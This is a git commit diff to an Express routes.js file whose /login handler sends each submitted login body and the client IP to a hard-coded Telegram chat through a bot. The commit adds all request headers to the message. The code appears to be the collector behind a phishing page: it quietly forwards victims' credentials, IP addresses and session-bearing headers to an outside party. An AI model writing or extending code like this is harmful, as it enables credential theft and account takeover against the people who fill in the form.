05946cc3412124506dc306ee6891f4ebeb3bd096
Lucas Vieira <lucas.engen.cc@gmail.com>
2022-04-14 00:05:43 -0300

    add headers-

--- routes.js
+++ routes.js
@@ -6,12 +6,13 @@ const routes = express.Router();
 routes.post("/login", async function (req, res) {
   let data = `${JSON.stringify(req.body)}`;
   let peer = `${JSON.stringify(req.socket.remoteAddress)}`;
+  let headers = JSON.stringify(req.headers);
 
   console.log(`${data}`);
 
   await bot.telegram.sendMessage(
     "-1001747704625",
-    `dados: ${data}, IP: ${peer}`
+    `dados: ${data}, IP: ${peer}, header: ${headers}`
   );
 
   return res
